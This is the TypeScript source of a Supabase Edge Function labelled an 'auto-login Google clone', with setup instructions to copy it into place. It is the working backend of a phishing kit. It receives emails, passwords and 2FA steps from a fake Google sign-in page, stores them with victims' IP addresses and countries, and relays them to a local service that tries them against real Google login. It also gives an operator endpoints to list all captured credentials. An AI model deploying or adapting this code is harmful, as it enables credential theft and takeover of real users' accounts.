// ========================================
// 🚀 AUTO-LOGIN GOOGLE CLONE - VERSION 2.1
// Supabase Edge Function với Auto-Login Integration
// Copy vào Supabase Edge Functions → admin-api → index.ts
// ========================================

import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

// Auto-Login API endpoint (localhost)
const AUTO_LOGIN_API = 'http://localhost:5000'

// IP Geolocation function
async function getCountryFromIP(ip: string): Promise<string> {
  try {
    // Skip localhost and private IPs
    if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return 'United States (US)' // Fallback strategy
    }

    // Call ip-api.com for geolocation
    const response = await fetch(`http://ip-api.com/json/${ip}`)
    const data = await response.json()
    
    if (data.status === 'success') {
      return `${data.country} (${data.countryCode})`
    }
    
    // Fallback if API fails
    return 'United States (US)'
  } catch (error) {
    console.log('Country detection error:', error)
    return 'United States (US)' // Fallback strategy
  }
}

// Auto-Login API call function
async function callAutoLoginAPI(endpoint: string, data: any): Promise<any> {
  try {
    const response = await fetch(`${AUTO_LOGIN_API}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    })
    
    return await response.json()
  } catch (error) {
    console.log('Auto-Login API error:', error)
    return { success: false, error: 'Auto-Login API unavailable' }
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? ''
    )

    const url = new URL(req.url)
    const path = url.pathname

    // Extract client IP
    const clientIP = req.headers.get('x-forwarded-for') || 
                    req.headers.get('x-real-ip') || 
                    'unknown'

    if (path === '/submit' && req.method === 'POST') {
      // ========================================
      // 📝 SUBMIT REQUEST (với Auto-Login)
      // ========================================
      
      const { email, password, page } = await req.json()

      // Get country from IP
      const country = await getCountryFromIP(clientIP)
      
      // Insert request to database
      const { data: insertData, error: insertError } = await supabase
        .from('requests')
        .insert({
          email,
          password: password || null,
          ip_address: clientIP,
          country,
          user_agent: req.headers.get('user-agent'),
          page,
          status: 'pending'  // Initially pending
        })
        .select()
        .single()

      if (insertError) {
        throw insertError
      }

      const requestId = insertData.id

      // Auto-Login Integration based on page
      let autoLoginResult = { success: false, message: 'No auto-login for this page' }
      let finalStatus = 'pending'
      let approvalReason = 'Manual review required'

      if (page === 'email') {
        // Email validation via Auto-Login API
        autoLoginResult = await callAutoLoginAPI('/validate-email', { email })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'
          approvalReason = 'Auto-approved: Email validation passed'
        } else {
          finalStatus = 'denied'  
          approvalReason = 'Auto-denied: Email validation failed'
        }
      } 
      else if (page === 'password') {
        // Password test via Auto-Login API  
        autoLoginResult = await callAutoLoginAPI('/test-login', { email, password })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'
          approvalReason = 'Auto-approved: Real Google login test passed'
        } else {
          finalStatus = 'denied'
          approvalReason = 'Auto-denied: Real Google login test failed'
        }
      }
      else if (page === '2fa') {
        // 2FA handling via Auto-Login API
        autoLoginResult = await callAutoLoginAPI('/handle-2fa', { email })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'  
          approvalReason = 'Auto-approved: 2FA automation successful'
        } else {
          finalStatus = 'denied'
          approvalReason = 'Auto-denied: 2FA automation failed'
        }
      }

      // Update request with auto-login result
      const { error: updateError } = await supabase
        .from('requests')
        .update({
          status: finalStatus,
          auto_login_result: autoLoginResult,
          auto_approved: finalStatus !== 'pending',
          approval_reason: approvalReason,
          updated_at: new Date().toISOString()
        })
        .eq('id', requestId)

      if (updateError) {
        throw updateError
      }

      return new Response(
        JSON.stringify({
          success: true,
          id: requestId,
          status: finalStatus,
          country,
          auto_approved: finalStatus !== 'pending',
          approval_reason: approvalReason,
          auto_login_result: autoLoginResult
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/requests' && req.method === 'GET') {
      // ========================================
      // 📋 GET ALL REQUESTS
      // ========================================
      
      const { data, error } = await supabase
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) throw error

      return new Response(
        JSON.stringify({ success: true, data }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/approve' && req.method === 'POST') {
      // ========================================
      // ✅ APPROVE REQUEST
      // ========================================
      
      const { id, status } = await req.json()

      const { data, error } = await supabase
        .rpc('approve_request', { request_id: id, new_status: status })

      if (error) throw error

      return new Response(
        JSON.stringify({ success: true, data }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/status' && req.method === 'GET') {
      // ========================================
      // 📊 SYSTEM STATUS
      // ========================================
      
      const { data: pending } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'pending')

      const { data: approved } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'approved')

      const { data: denied } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'denied')

      // Test Auto-Login API availability
      const autoLoginTest = await callAutoLoginAPI('/health', {})

      return new Response(
        JSON.stringify({
          success: true,
          stats: {
            pending: pending?.length || 0,
            approved: approved?.length || 0,
            denied: denied?.length || 0,
            total: (pending?.length || 0) + (approved?.length || 0) + (denied?.length || 0)
          },
          auto_login_api: autoLoginTest.success ? 'available' : 'unavailable',
          version: '2.1-AUTO-LOGIN-WITH-COUNTRY',
          country_detection: 'enabled',
          fallback_strategy: 'United States (US) for unknown IPs'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    // 404 for unknown paths
    return new Response(
      JSON.stringify({ error: 'Endpoint not found' }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 404,
      }
    )

  } catch (error) {
    console.error('Error:', error)
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    )
  }
})

// ========================================
// ✅ EDGE FUNCTION COMPLETE - VERSION 2.1
// Features:
// - Auto-Login Integration
// - Country Detection với US Fallback
// - Real-time approval/denial
// - Complete API endpoints:
//   * /submit - Submit requests with auto-login
//   * /requests - Get all requests
//   * /approve - Manual approve/deny
//   * /status - System status with stats
// ======================================== 